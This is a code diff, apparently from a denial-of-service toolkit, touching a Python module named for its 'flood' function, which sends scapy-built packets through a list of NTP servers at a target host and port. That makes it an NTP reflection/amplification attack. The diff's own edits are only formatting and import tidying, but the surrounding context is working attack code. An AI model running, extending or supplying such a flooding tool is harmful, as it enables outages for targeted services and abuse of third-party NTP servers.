@@ -1,11 +1,12 @@
 # Import modules
 import random
-from scapy.all import IP, send, Raw, UDP
 from socket import gaierror
+
 from colorama import Fore
+from scapy.all import IP, UDP, Raw, send
 
 # Load NTP servers list
-with open("tools/L4/ntp_servers.txt", "r") as f:
+with open("tools/L4/ntp_servers.txt") as f:
     ntp_servers = f.readlines()
 
 # Payload
@@ -27,13 +28,13 @@ def flood(target):
         send(packet, count=packets, verbose=False)
     except gaierror:
         print(
-            f"{Fore.RED}[!] {Fore.MAGENTA}NTP server {server} is offline!{Fore.RESET}"
+            f"{Fore.RED}[!] {Fore.MAGENTA}NTP server {server} is offline!{Fore.RESET}",
         )
     except Exception as e:
         print(
-            f"{Fore.MAGENTA}Error while sending NTP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
+            f"{Fore.MAGENTA}Error while sending NTP packet\n{Fore.MAGENTA}{e}{Fore.RESET}",
         )
     else:
         print(
-            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
+            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}",
         )
